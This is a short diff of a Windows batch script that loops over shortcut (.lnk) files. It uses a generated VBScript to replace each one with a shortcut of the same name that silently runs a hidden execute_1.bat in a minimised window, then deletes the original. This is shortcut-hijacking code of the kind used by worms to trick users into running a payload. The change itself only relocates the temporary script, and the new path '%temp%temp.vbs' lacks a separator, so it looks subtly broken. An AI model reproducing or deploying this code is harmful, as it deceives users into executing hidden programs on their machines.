@@ -12,16 +12,16 @@ for /R "%cd%" %%F in (*.lnk) do (
 cd !hidden!
 
 cd ..
-echo Set oWS = WScript.CreateObject("WScript.Shell") > temp.vbs
-echo sLinkFile = "%cd%\temp.lnk" >> temp.vbs
-echo Set oLink = oWS.CreateShortcut(sLinkFile) >> temp.vbs
-echo oLink.TargetPath = "%cd%\!hidden!\execute_1.bat" >> temp.vbs
-echo oLink.WorkingDirectory = "%cd%\!hidden!\" >> temp.vbs
-echo oLink.IconLocation = "%cd%\!hidden!\icon.ico" >> temp.vbs
-echo oLink.WindowStyle = "7" >> temp.vbs
-echo oLink.Save >> temp.vbs
-cscript temp.vbs
-del temp.vbs
+echo Set oWS = WScript.CreateObject("WScript.Shell") > %temp%temp.vbs
+echo sLinkFile = "%cd%\temp.lnk" >> %temp%temp.vbs
+echo Set oLink = oWS.CreateShortcut(sLinkFile) >> %temp%temp.vbs
+echo oLink.TargetPath = "%cd%\!hidden!\execute_1.bat" >> %temp%temp.vbs
+echo oLink.WorkingDirectory = "%cd%\!hidden!\" >> %temp%temp.vbs
+echo oLink.IconLocation = "%cd%\!hidden!\icon.ico" >> %temp%temp.vbs
+echo oLink.WindowStyle = "7" >> %temp%temp.vbs
+echo oLink.Save >> %temp%temp.vbs
+cscript %temp%temp.vbs
+del %temp%temp.vbs
 
 del "!name!.lnk"
 ren temp.lnk "!name!.lnk"
